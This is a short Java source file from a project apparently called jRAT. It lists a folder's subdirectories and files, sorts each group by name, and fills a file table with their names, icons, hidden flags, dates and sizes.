package jrat.module.fs;

import iconlib.FileIconUtils;
import jrat.controller.io.FileObject;
import jrat.module.fs.ui.FileTable;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class FileSystem {
	
	public static void addDir(String folder, FileTable table) {
		addDir(new File(folder), table);
	}
	
	public static void addDir(File folder, FileTable table) {
		if (folder.exists()) {
			File[] childs = folder.listFiles();
			List<File> files = new ArrayList<>();
			List<File> dirs = new ArrayList<>();

			if (childs != null) {
				for (File file : childs) {
					if (file.isDirectory()) {
						dirs.add(file);
					} else {
						files.add(file);
					}
				}
			}

			sort(dirs);
			for (File file : dirs) {
				FileObject fo = new FileObject(file.getAbsolutePath());
				fo.setHidden(file.isHidden());
				fo.setIcon(FileIconUtils.getIconFromFile(file));
				
				table.addFileObject(fo);
			}

			sort(files);
			for (File file : files) {
				FileObject fo = new FileObject(file.getAbsolutePath());
				fo.setHidden(file.isHidden());
				fo.setIcon(FileIconUtils.getIconFromFile(file));
				fo.setDate(file.lastModified());
				fo.setSize(file.length());
				
				table.addFileObject(fo);
			}
		}
	}

	private static void sort(List<File> files) {
        Collections.sort(files, new Comparator() {
            @Override
            public int compare(Object a, Object b) {
                return ((File)a).getName().compareTo(((File)b).getName());
            }
        });
    }

}
